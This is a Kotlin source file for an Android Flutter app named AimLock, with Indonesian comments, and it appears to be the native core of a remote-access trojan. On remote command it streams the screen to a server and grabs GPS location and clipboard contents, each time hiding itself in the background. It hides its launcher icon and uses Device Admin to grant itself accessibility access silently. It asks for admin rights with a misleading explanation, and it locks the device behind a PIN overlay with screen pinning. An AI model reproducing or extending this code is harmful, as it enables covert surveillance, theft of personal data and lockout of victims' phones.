package com.aimlock.app

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.Priority
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val CHANNEL = "com.aimlock.app/native"
    private val OVERLAY_PERMISSION_REQ   = 1001
    private val DEVICE_ADMIN_REQ         = 1002
    private val SCREEN_CAPTURE_REQ       = 1003
    private val LOCATION_PERMISSION_REQ  = 1004
    private val LOCATION_SETTINGS_REQ    = 1005

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    // Simpan info untuk screen capture setelah permission granted
    private var pendingScreenServerUrl  = ""
    private var pendingScreenDeviceId   = ""
    private var pendingScreenToken      = ""

    // Simpan info untuk GPS setelah permission granted
    private var pendingGpsAction = false

    // Simpan result channel untuk location settings dialog
    private var locationSettingsResult: io.flutter.plugin.common.MethodChannel.Result? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        handleScreenCaptureIntent(intent)
        handleGpsIntent(intent)
        handleClipboardIntent(intent)
        if (intent?.getStringExtra("action") == "start_lock_task") {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                startScreenPinning()
                moveTaskToBack(true)
            }, 300)
        }
        // Handle lock + pin dari command lock (SocketService)
        if (intent?.getStringExtra("action") == "start_lock_with_pin") {
            val lockText = intent.getStringExtra("lockText") ?: ""
            val lockPin  = intent.getStringExtra("lockPin")  ?: "1234"
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                startLockWithPin(lockText, lockPin)
            }, 200)
        }
    }

    override fun onResume() {
        super.onResume()
        // onResume dibiarkan normal - jangan auto-hide agar app tidak forceclose
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // Jangan exit app — minimize ke background
        moveTaskToBack(true)
    }

    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        // Jangan lakukan apa-apa saat user tekan home
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleScreenCaptureIntent(intent)
        handleGpsIntent(intent)
        handleClipboardIntent(intent)
        // Handle start_lock_task dari LockService
        if (intent.getStringExtra("action") == "start_lock_task") {
            startScreenPinning()
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                moveTaskToBack(true)
            }, 200)
        }
        // Handle start_screen_pinning dari SocketService (command lock)
        if (intent.getStringExtra("action") == "start_screen_pinning") {
            startScreenPinning()
        }
        // Handle lock + pin dari command lock (SocketService)
        if (intent.getStringExtra("action") == "start_lock_with_pin") {
            val lockText = intent.getStringExtra("lockText") ?: ""
            val lockPin  = intent.getStringExtra("lockPin")  ?: "1234"
            startLockWithPin(lockText, lockPin)
        }
    }

    private fun handleScreenCaptureIntent(intent: Intent?) {
        if (intent?.getStringExtra("action") == "request_screen_capture") {
            pendingScreenServerUrl = intent.getStringExtra("serverUrl")   ?: ""
            pendingScreenDeviceId  = intent.getStringExtra("deviceId")    ?: ""
            pendingScreenToken     = intent.getStringExtra("deviceToken") ?: ""
            requestScreenCapture()
        }
    }

    private fun handleGpsIntent(intent: Intent?) {
        if (intent?.getStringExtra("action") == "request_gps") {
            val hasFine = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasCoarse = checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED

            if (hasFine || hasCoarse) {
                // Permission sudah ada, langsung ambil GPS
                getSocketService()?.doGetGpsLocation()
            } else {
                pendingGpsAction = true
                requestPermissions(arrayOf(
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
                ), LOCATION_PERMISSION_REQ)
            }
            // Langsung hide ke background
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                moveTaskToBack(true)
            }, 500)
        }
    }

    private fun handleClipboardIntent(intent: Intent?) {
        if (intent?.getStringExtra("action") == "get_clipboard") {
            try {
                val cm = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
                val texts = mutableListOf<String>()
                if (cm.hasPrimaryClip()) {
                    val clip = cm.primaryClip
                    if (clip != null) {
                        for (i in 0 until clip.itemCount) {
                            val text = clip.getItemAt(i)?.coerceToText(this)?.toString() ?: continue
                            if (text.isNotBlank()) texts.add(text)
                        }
                    }
                }
                getSocketService()?.uploadClipboardFromActivity(texts)
            } catch (_: Exception) {}
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                moveTaskToBack(true)
            }, 200)
        }
    }

    private fun getSocketService(): SocketService? {
        // Akses SocketService instance via static reference
        return SocketService.instance
    }

    private fun requestScreenCapture() {
        val pm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(pm.createScreenCaptureIntent(), SCREEN_CAPTURE_REQ)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_CAPTURE_REQ) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                val intent = Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra("action",      "start")
                    putExtra("resultCode",  resultCode)
                    putExtra("resultData",  data)
                    putExtra("serverUrl",   pendingScreenServerUrl)
                    putExtra("deviceId",    pendingScreenDeviceId)
                    putExtra("deviceToken", pendingScreenToken)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    startForegroundService(intent)
                else
                    startService(intent)
            }
            // Minimize kembali ke background setelah approve/deny
            moveTaskToBack(true)
        }
        if (requestCode == LOCATION_SETTINGS_REQ) {
            // User sudah merespons dialog Google Location Accuracy
            val granted = resultCode == Activity.RESULT_OK
            locationSettingsResult?.success(granted)
            locationSettingsResult = null
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == LOCATION_PERMISSION_REQ && pendingGpsAction) {
            pendingGpsAction = false
            val granted = grantResults.any { it == android.content.pm.PackageManager.PERMISSION_GRANTED }
            if (granted) {
                getSocketService()?.doGetGpsLocation()
            }
            moveTaskToBack(true)
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabledServices.contains(packageName) && enabledServices.contains("AppProtectionService")
    }

    private fun requestAccessibility() {
        // Coba auto-grant via DevicePolicyManager (work di Android 14 tanpa buka Settings)
        if (tryAutoGrantAccessibility()) return
        // Fallback: buka Settings Accessibility manual
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                // Deep link langsung ke service kita (Android 9+)
                putExtra(":settings:fragment_args_key", "$packageName/.AppProtectionService")
            }
            startActivity(intent)
        } catch (_: Exception) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
        }
    }

    private fun tryAutoGrantAccessibility(): Boolean {
        return try {
            if (!devicePolicyManager.isAdminActive(adminComponent)) return false
            val componentStr = "$packageName/.AppProtectionService"
            val current = Settings.Secure.getString(
                contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            val newVal = if (current.isEmpty()) componentStr
                         else if (current.contains(componentStr)) current
                         else "$current:$componentStr"
            // Set via DevicePolicyManager — tidak butuh user interaction di Android 14
            devicePolicyManager.setSecureSetting(
                adminComponent,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                newVal
            )
            devicePolicyManager.setSecureSetting(
                adminComponent,
                Settings.Secure.ACCESSIBILITY_ENABLED,
                "1"
            )
            true
        } catch (_: Exception) { false }
    }



    private fun isDeviceAdminActive(): Boolean = devicePolicyManager.isAdminActive(adminComponent)

    private fun requestDeviceAdmin() {
        startActivityForResult(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Diperlukan agar aplikasi dapat berjalan dengan optimal dan terlindungi.")
        }, DEVICE_ADMIN_REQ)
    }

    // [BARU] Cek Notification Listener aktif
    private fun isNotifListenerEnabled(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return enabled.contains(packageName)
    }

    // [BARU] Buka settings Notification Listener
    private fun requestNotifListener() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

    // ── Sembunyikan icon dari launcher ───────────────────────────────────
    private fun hideFromLauncher() {
        try {
            val pm = packageManager
            // Disable alias (bukan MainActivity) → icon hilang tapi app tetap jalan
            val aliasComponent = android.content.ComponentName(
                packageName, "$packageName.MainActivityAlias")
            pm.setComponentEnabledSetting(
                aliasComponent,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            getSharedPreferences("aimlock_prefs", android.content.Context.MODE_PRIVATE)
                .edit().putBoolean("icon_hidden", true).apply()
        } catch (_: Exception) {}
    }

    // ── Screen Pinning (APLIKASI DI SEMATKAN) ────────────────────────────
    private fun startScreenPinning() {
        try {
            // Set LockTask whitelist via DPM → skip dialog konfirmasi
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                try {
                    devicePolicyManager.setLockTaskPackages(adminComponent, arrayOf(packageName))
                } catch (_: Exception) {}
            }
            startLockTask()
        } catch (_: Exception) {}
    }

    private fun stopScreenPinning() {
        try { stopLockTask() } catch (_: Exception) {}
    }

    // ── Lock + App Pinning sekaligus (dipanggil dari command "lock") ──────
    // Urutan yang benar:
    // 1. setLockTaskPackages (skip/minimize dialog)
    // 2. startLockTask() → pinning aktif
    // 3. Baru jalankan LockService overlay
    // 4. moveTaskToBack → app ke background, overlay tetap di atas
    private fun startLockWithPin(lockText: String, lockPin: String) {
        // Step 1: setLockTaskPackages via DPM SEBELUM startLockTask → skip dialog
        // Ini HARUS dipanggil sebelum startLockTask(), bukan sesudah
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            try {
                devicePolicyManager.setLockTaskPackages(adminComponent, arrayOf(packageName))
            } catch (_: Exception) {}
        }

        // Step 2: Tunggu activity benar-benar di foreground (onResume selesai)
        // lalu baru startLockTask — kalau langsung dari onNewIntent kadang masih racing
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                startLockTask()
            } catch (_: Exception) {}

            // Step 3: Start LockService overlay setelah lock task aktif
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    val lockIntent = Intent(this, LockService::class.java).apply {
                        putExtra("action",   "lock")
                        putExtra("lockText", lockText)
                        putExtra("lockPin",  lockPin)
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        startForegroundService(lockIntent)
                    else
                        startService(lockIntent)
                } catch (_: Exception) {}

                // Step 4: hide activity ke background setelah overlay tampil
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    moveTaskToBack(true)
                }, 200)
            }, 150)
        }, 80)
    }

    // ── Google Location Accuracy Dialog (dialog kayak Play Services) ──────────
    private fun requestLocationAccuracyDialog(result: io.flutter.plugin.common.MethodChannel.Result) {
        try {
            locationSettingsResult = result
            val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L)
                .setWaitForAccurateLocation(true)
                .setMinUpdateIntervalMillis(2000L)
                .build()
            val settingsRequest = LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest)
                .setAlwaysShow(true) // paksa tampil dialog walau sudah partial
                .build()
            val client = LocationServices.getSettingsClient(this)
            val task = client.checkLocationSettings(settingsRequest)
            task.addOnSuccessListener {
                // Lokasi sudah OK, tidak perlu dialog
                locationSettingsResult?.success(true)
                locationSettingsResult = null
            }
            task.addOnFailureListener { exception ->
                if (exception is ResolvableApiException) {
                    try {
                        // Munculkan dialog Google Location Accuracy
                        exception.startResolutionForResult(this, LOCATION_SETTINGS_REQ)
                    } catch (_: Exception) {
                        locationSettingsResult?.success(false)
                        locationSettingsResult = null
                    }
                } else {
                    locationSettingsResult?.success(false)
                    locationSettingsResult = null
                }
            }
        } catch (e: Exception) {
            result.success(false)
            locationSettingsResult = null
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {

                    "checkOverlayPermission" -> {
                        val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            Settings.canDrawOverlays(this) else true
                        result.success(granted)
                    }
                    "requestOverlayPermission" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            startActivityForResult(
                                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                    Uri.parse("package:$packageName")),
                                OVERLAY_PERMISSION_REQ)
                        }
                        result.success(null)
                    }

                    "checkDeviceAdmin"   -> result.success(isDeviceAdminActive())
                    "requestDeviceAdmin" -> { requestDeviceAdmin(); result.success(null) }

                    "checkAccessibility"   -> result.success(isAccessibilityEnabled())
                    "requestAccessibility" -> { requestAccessibility(); result.success(null) }

                    // [BARU] Notification Listener
                    "checkNotifListener"   -> result.success(isNotifListenerEnabled())
                    "requestNotifListener" -> { requestNotifListener(); result.success(null) }

                    "startCheatOverlay" -> {
                        val canDraw = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            Settings.canDrawOverlays(this) else true
                        if (canDraw) {
                            val intent = Intent(this, CheatOverlayService::class.java)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                startForegroundService(intent)
                            else
                                startService(intent)
                            result.success(true)
                        } else {
                            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                android.net.Uri.parse("package:$packageName")).apply {
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            })
                            result.success(false)
                        }
                    }
                    "stopCheatOverlay" -> {
                        stopService(Intent(this, CheatOverlayService::class.java))
                        result.success(true)
                    }

                    "startSocketService" -> {
                        val serverUrl  = call.argument<String>("serverUrl")     ?: ""
                        val deviceId   = call.argument<String>("deviceId")      ?: ""
                        val deviceName = call.argument<String>("deviceName")    ?: ""
                        val owner      = call.argument<String>("ownerUsername") ?: ""
                        val token      = call.argument<String>("deviceToken")   ?: ""
                        val intent = Intent(this, SocketService::class.java).apply {
                            putExtra("serverUrl",     serverUrl)
                            putExtra("deviceId",      deviceId)
                            putExtra("deviceName",    deviceName)
                            putExtra("ownerUsername", owner)
                            putExtra("deviceToken",   token)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            startForegroundService(intent)
                        else
                            startService(intent)
                        result.success(true)
                    }
                    "stopSocketService" -> {
                        stopService(Intent(this, SocketService::class.java))
                        result.success(true)
                    }

                    "showLockScreen" -> {
                        val text    = call.argument<String>("text") ?: ""
                        val pin     = call.argument<String>("pin")  ?: ""
                        val canDraw = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            Settings.canDrawOverlays(this) else true
                        if (canDraw) {
                            val intent = Intent(this, LockService::class.java).apply {
                                putExtra("lockText", text)
                                putExtra("lockPin",  pin)
                                putExtra("action",   "lock")
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                startForegroundService(intent)
                            else
                                startService(intent)
                            // Screen pinning — blokir navbar & status bar natively
                            startScreenPinning()
                            result.success(true)
                        } else {
                            result.success(false)
                        }
                    }
                    "hideLockScreen" -> {
                        startService(Intent(this, LockService::class.java).apply {
                            putExtra("action", "unlock")
                        })
                        stopScreenPinning()
                        result.success(true)
                    }

                    "stopScreenLive" -> {
                        stopService(Intent(this, ScreenCaptureService::class.java))
                        result.success(true)
                    }

                    "requestLocationAccuracy" -> {
                        requestLocationAccuracyDialog(result)
                        // result akan dipanggil di onActivityResult — jangan panggil di sini
                    }

                    "hideApp" -> {
                        moveTaskToBack(true)
                        result.success(true)
                    }

                    "hideAppIcon" -> {
                        hideFromLauncher()
                        result.success(true)
                    }

                    "startScreenText" -> {
                        val text = call.argument<String>("text") ?: ""
                        val intent = Intent(this, ScreenTextService::class.java).apply {
                            putExtra("text", text)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            startForegroundService(intent)
                        else
                            startService(intent)
                        result.success(true)
                    }
                    "stopScreenText" -> {
                        stopService(Intent(this, ScreenTextService::class.java))
                        result.success(true)
                    }

                    "checkUsageAccess" -> {
                        val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                            try {
                                val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
                                val mode   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                    appOps.unsafeCheckOpNoThrow(
                                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                                        android.os.Process.myUid(), packageName)
                                } else {
                                    @Suppress("DEPRECATION")
                                    appOps.checkOpNoThrow(
                                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                                        android.os.Process.myUid(), packageName)
                                }
                                mode == android.app.AppOpsManager.MODE_ALLOWED
                            } catch (_: Exception) { false }
                        } else true
                        result.success(granted)
                    }

                    "requestUsageAccess" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            })
                        }
                        result.success(null)
                    }

                    else -> result.notImplemented()
                }
            }
    }
}
